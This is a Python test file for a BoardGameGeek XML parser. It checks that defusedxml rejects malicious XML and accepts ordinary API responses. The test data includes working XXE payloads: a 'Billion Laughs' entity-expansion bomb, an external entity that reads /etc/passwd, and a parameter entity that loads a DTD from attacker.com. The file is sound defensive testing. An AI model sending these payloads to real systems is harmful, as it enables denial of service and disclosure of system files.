"""Tests verifying that malicious XML entities are rejected by defusedxml.

Ensures that the BGG parser (and any other XML parser) using ``defusedxml``
correctly rejects payloads containing external entities (XXE) and
entity-expansion "Billion Laughs" attacks without causing excessive resource
consumption or data leaks.
"""

# Copyright (C) 2026 Sebastian Ryszard Kruk (dev@kruk.me)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>
#

import defusedxml.ElementTree as SafeET
import pytest
from defusedxml import DefusedXmlException

# ---------------------------------------------------------------------------
# Malicious XML payloads
# ---------------------------------------------------------------------------

# "Billion Laughs" (entity expansion DoS) — classic XXE attack vector
BILLION_LAUGHS_PAYLOAD = b"""\
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
"""

# External entity injection attempting to read /etc/passwd
XXE_FILE_READ_PAYLOAD = b"""\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
"""

# Parameter entity injection
PARAMETER_ENTITY_PAYLOAD = b"""\
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd">
  %pe;
]>
<root>data</root>
"""


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestXxePrevention:
    """Verify that defusedxml rejects common XXE attack vectors."""

    def test_rejects_billion_laughs(self) -> None:
        """The 'Billion Laughs' entity-expansion attack must be rejected."""
        with pytest.raises(DefusedXmlException):
            SafeET.fromstring(BILLION_LAUGHS_PAYLOAD)

    def test_rejects_external_entity_file_read(self) -> None:
        """External entity attempting local file read must be rejected."""
        with pytest.raises(DefusedXmlException):
            SafeET.fromstring(XXE_FILE_READ_PAYLOAD)

    def test_rejects_parameter_entity(self) -> None:
        """Parameter entity injection must be rejected."""
        with pytest.raises(DefusedXmlException):
            SafeET.fromstring(PARAMETER_ENTITY_PAYLOAD)

    def test_accepts_benign_xml(self) -> None:
        """Well-formed, benign XML should parse correctly."""
        benign_xml = b"<items><item id='1'><name value='Chess'/></item></items>"
        root = SafeET.fromstring(benign_xml)
        assert root.tag == "items"
        item = root.find("item")
        assert item is not None
        assert item.attrib["id"] == "1"

    def test_accepts_typical_bgg_response(self) -> None:
        """Typical BGG XML API response should parse without issues."""
        bgg_xml = b"""\
<items total="1" termsofuse="https://boardgamegeek.com/xmlapi/termsofuse">
  <item type="boardgame" id="12345">
    <name type="primary" value="Test Game"/>
    <yearpublished value="2024"/>
    <description>A test game</description>
    <image>https://cf.geekdo-images.com/test.jpg</image>
    <minplayers value="2"/>
    <maxplayers value="4"/>
    <playingtime value="60"/>
  </item>
</items>
"""
        root = SafeET.fromstring(bgg_xml)
        assert root.tag == "items"
        item = root.find("item")
        assert item is not None
        name = item.find("name[@type='primary']")
        assert name is not None
        assert name.attrib["value"] == "Test Game"
